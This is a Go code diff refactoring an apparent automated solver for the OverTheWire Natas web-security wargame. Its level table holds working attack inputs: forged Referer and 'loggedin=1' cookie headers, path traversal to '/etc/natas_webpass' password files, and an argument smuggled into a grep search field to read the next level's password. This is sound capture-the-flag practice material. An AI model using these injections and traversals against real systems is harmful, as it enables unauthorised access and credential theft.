@@ -57,87 +57,147 @@ func (p Path) Grab(r http.Request) (string, error) {
 
 type Headers struct {
 	Grabber
-	Headers http.Header
+	Headers SetData
 }
 
 func (h Headers) Grab(r http.Request) (string, error) {
-	oldHeaders := r.Header
-	r.Header = make(http.Header)
-	for key, value := range oldHeaders {
-		r.Header[key] = value
+	newHeaders := make(http.Header)
+	for key, value := range r.Header {
+		newHeaders[key] = value
 	}
-	for key, value := range h.Headers {
-		r.Header[key] = value
+	if err := h.Headers.Set(r, newHeaders); err != nil {
+		return "", err
 	}
+	r.Header = newHeaders
 	return h.Grabber.Grab(r)
 }
 
 type Post struct {
 	Grabber
-	Data url.Values
+	Data SetData
 }
 
 func (p Post) Grab(r http.Request) (string, error) {
-	m := memio.Buffer(p.Data.Encode())
+	values := make(url.Values, len(p.Data))
+	if err := p.Data.Set(r, values); err != nil {
+		return "", err
+	}
+	m := memio.Buffer(values.Encode())
 	r.Body = &m
 	r.Method = http.MethodPost
 	r.ContentLength = int64(len(m))
-	h := Headers{p.Grabber, http.Header{"Content-Type": []string{"application/x-www-form-urlencoded"}}}
+	h := Headers{p.Grabber, map[string]Grabber{"Content-Type": Text{"application/x-www-form-urlencoded"}}}
 	return h.Grab(r)
-}
-
-type SetPost struct {
-	Post
-	Grabber
-	Key string
-}
-
-func (s SetPost) Grab(r http.Request) (string, error) {
-	d, err := s.Grabber.Grab(r)
-	if err != nil {
-		return "", err
-	}
-	s.Data.Set(s.Key, d)
-	return s.Post.Grab(r)
 }
 
 type Get struct {
 	Grabber
-	Data url.Values
+	Data SetData
 }
 
 func (g Get) Grab(r http.Request) (string, error) {
+	values := make(url.Values, len(g.Data))
+	if err := g.Data.Set(r, values); err != nil {
+		return "", err
+	}
 	oldQuery := r.URL.RawQuery
-	r.URL.RawQuery = g.Data.Encode()
+	r.URL.RawQuery = values.Encode()
 	s, err := g.Grabber.Grab(r)
 	r.URL.RawPath = oldQuery
 	return s, err
 }
 
-type Decode8 struct {
+type Hex2Dec struct {
 	Grabber
 }
 
-func (d Decode8) Grab(r http.Request) (string, error) {
-	hrb, err := d.Grabber.Grab(r)
+func (h Hex2Dec) Grab(r http.Request) (string, error) {
+	hx, err := h.Grabber.Grab(r)
 	if err != nil {
 		return "", err
 	}
-	rb := make([]byte, hex.DecodedLen(len(hrb)))
-	_, err = hex.Decode(rb, []byte(hrb))
+	dec := make([]byte, hex.DecodedLen(len(hx)))
+	_, err = hex.Decode(dec, []byte(hx))
 	if err != nil {
 		return "", err
 	}
-	b := make([]byte, len(rb))
-	for n, d := range rb {
-		b[len(b)-n-1] = d
-	}
-	secret := make([]byte, base64.StdEncoding.DecodedLen(len(b)))
-	_, err = base64.StdEncoding.Decode(secret, b)
+	return string(dec), nil
+}
+
+type Reverse struct {
+	Grabber
+}
+
+func (rv Reverse) Grab(r http.Request) (string, error) {
+	str, err := rv.Grabber.Grab(r)
 	if err != nil {
 		return "", err
 	}
-	return string(bytes.TrimRight(secret, "\x00")), nil
+	rts := make([]byte, len(str))
+	for n, b := range []byte(str) {
+		rts[len(rts)-n-1] = b
+	}
+	return string(rts), nil
+}
+
+type Base64Decode struct {
+	Grabber
+}
+
+func (b Base64Decode) Grab(r http.Request) (string, error) {
+	str, err := b.Grabber.Grab(r)
+	if err != nil {
+		return "", err
+	}
+	res, err := base64.StdEncoding.DecodeString(str)
+	if err != nil {
+		return "", err
+	}
+	return string(res), nil
+}
+
+type Cookie struct {
+	Name string
+}
+
+func (c Cookie) Grab(r http.Request) (string, error) {
+	r.Method = http.MethodHead
+	resp, err := http.DefaultClient.Do(&r)
+	if err != nil {
+		return "", err
+	}
+	cookies := resp.Cookies()
+	for _, cookie := range cookies {
+		if cookie.Name == c.Name {
+			return cookie.Value, nil
+		}
+	}
+	return "", errors.Error("could not find cookie")
+}
+
+type SetData map[string]Grabber
+
+type Setter interface {
+	Set(string, string)
+}
+
+func (sd SetData) Set(r http.Request, s Setter) error {
+	for key, g := range sd {
+		value, err := g.Grab(r)
+		if err != nil {
+			return err
+		}
+		s.Set(key, value)
+	}
+	return nil
+}
+
+type Text struct {
+	Text string
+}
+
+func (t Text) Grab(http.Request) (string, error) {
+	return t.Text, nil
 }
 
 var levels = [...]Grabber{
@@ -145,13 +205,13 @@ var levels = [...]Grabber{
 	Prefixed{"The password for natas2 is ", 32},
 	Path{Prefixed{"natas3:", 32}, "/files/users.txt"},  // image @ /files/pixel.png, go to folder, find users.txt
 	Path{Prefixed{"natas4:", 32}, "/s3cr3t/users.txt"}, // robots.txt references /s3cr3t/, find users.txt
-	Headers{Prefixed{"The password for natas5 is ", 32}, http.Header{"Referer": []string{"http://natas5.natas.labs.overthewire.org/"}}},
-	Headers{Prefixed{"The password for natas6 is ", 32}, http.Header{"Cookie": []string{"loggedin=1"}}},
-	SetPost{Post{Prefixed{"The password for natas7 is ", 32}, url.Values{"submit": []string{"Submit Query"}}}, Path{Prefixed{"$secret = \"", 19}, "/includes/secret.inc"}, "secret"},
-	Get{Prefixed{"<br>\n<br>\n", 32}, url.Values{"page": []string{"/etc/natas_webpass/natas8"}}},
-	SetPost{Post{Prefixed{"The password for natas9 is ", 32}, url.Values{"submit": []string{"Submit Query"}}}, Decode8{Path{Prefixed{"$encodedSecret&nbsp;=&nbsp;\"", 32}, "/index-source.html"}}, "secret"},
-	Get{Prefixed{"/etc/natas_webpass/natas10:", 32}, url.Values{"needle": []string{"-H \"\" /etc/natas_webpass/natas10"}}},
-	Get{Prefixed{"/etc/natas_webpass/natas11:", 32}, url.Values{"needle": []string{"-H \"\" /etc/natas_webpass/natas11"}}},
+	Headers{Prefixed{"The password for natas5 is ", 32}, SetData{"Referer": Text{"http://natas5.natas.labs.overthewire.org/"}}},
+	Headers{Prefixed{"The password for natas6 is ", 32}, SetData{"Cookie": Text{"loggedin=1"}}},
+	Post{Prefixed{"The password for natas7 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Path{Prefixed{"$secret = \"", 19}, "/includes/secret.inc"}}},
+	Get{Prefixed{"<br>\n<br>\n", 32}, SetData{"page": Text{"/etc/natas_webpass/natas8"}}},
+	Post{Prefixed{"The password for natas9 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Base64Decode{Reverse{Hex2Dec{Path{Prefixed{"$encodedSecret&nbsp;=&nbsp;\"", 32}, "/index-source.html"}}}}}},
+	Get{Prefixed{"/etc/natas_webpass/natas10:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas10"}}},
+	Get{Prefixed{"/etc/natas_webpass/natas11:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas11"}}},
 }
 
 func main() {
